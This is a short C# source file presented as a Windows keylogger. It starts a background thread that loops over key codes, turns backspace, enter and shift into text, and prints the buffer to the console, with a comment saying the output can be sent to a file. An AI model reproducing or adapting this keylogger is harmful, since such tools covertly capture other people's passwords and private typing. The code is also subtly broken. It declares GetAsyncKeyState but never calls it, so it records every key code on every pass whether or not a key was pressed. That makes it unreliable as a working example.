using System;
using System.IO;
using System.Numerics;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLogger
{
    class Program
    {
        // this will be used to stop our keylogging function
        public bool islogging = false;
        // this string will be used to temporarily store our logged keystrokes
        public string loggedData = "";
        // we import the dll, and get our logging function
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int key);

        public void logKeyStrokes()
        {
            this.islogging = true;
            int key;
            while (this.islogging)
            {
                for (key = 8; key < 190; key++)
                {
                    // this will help us decipher which keys were pressed
                    this.checkKeys(key);
                }
            }
        }
        public void checkKeys(int keyCode)
        {
            switch (keyCode)
            {
                // if a backspace is pressed, then emulate it in our temporary string
                case 8:
                    if (!string.IsNullOrEmpty(this.loggedData))
                        this.loggedData = this.loggedData.Substring(0, this.loggedData.Length - 1);
                    break;
                case 9:
                    this.loggedData += "    ";
                    break;
                case 13:
                    this.loggedData += " [ENTER] ";
                    break;
                case 16:
                    this.loggedData += " [SHIFT] ";
                    break;
                default:
                    this.loggedData += (char)keyCode;
                    break;
            }
            // if our temporary string gets to a certain length, then output it to the console (can be modified to be used with a file instead)
            if (this.loggedData.Length >= 4)
            {
                Console.Write(this.loggedData);
                this.loggedData = string.Empty;
            }
        }
        // optional function to log key strokes as a seperate thread. Can be used to execute code WHILE logging keystrokes
        public void threadKeyLogging()
        {
            new Thread(new ThreadStart(this.logKeyStrokes)).Start();
        }
        public static void Main()
        {
            Program p = new Program();
            p.threadKeyLogging();
        }
    }
}
